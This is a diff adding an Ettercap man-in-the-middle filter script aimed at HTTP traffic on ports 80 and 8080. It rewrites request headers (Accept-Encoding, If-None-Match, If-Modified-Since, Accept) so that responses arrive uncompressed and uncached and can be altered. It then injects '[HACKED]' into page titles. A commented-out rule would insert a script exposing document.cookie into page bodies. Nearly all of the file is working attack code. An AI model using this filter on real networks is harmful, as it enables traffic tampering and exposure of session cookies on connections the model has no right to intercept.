@@ -1,0 +1,34 @@
+if (ip.proto == TCP && tcp.dst == 80 || tcp.dst == 8080 ) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        msg("Accept-Encoding.");
+        replace("Accept-Encoding", "Accept-Nothing.");
+    }
+
+    if (search(DATA.data, "If-None-Match")) {
+        msg("If-None-Match.");
+        replace("If-None-Match", "No-None-Match");
+    }
+
+    if (search(DATA.data, "If-Modified-Since")) {
+        msg("If-Modified-Since.");
+        replace("If-Modified-Since", "No-Modified-Since");
+    }
+
+    if (search(DATA.data, "Accept:")) {
+        msg("Accept.");
+        replace("Accept:", "Nccept:");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80 || tcp.src == 8080) {
+    #replace("keep-alive", "close");
+    #if (search(DATA.data, "<title>")) {
+        replace("<title>", "<title>[HACKED] ");
+    #    msg("Replaced Title.");
+    #}
+    #if (search(DATA.data, "<body>")) {
+    #    replace("<body>", "<script>document.write(document.cookie)</script><body>Hacked.<br>");
+    #    msg("Replaced Body.");
+    #}
+}
+
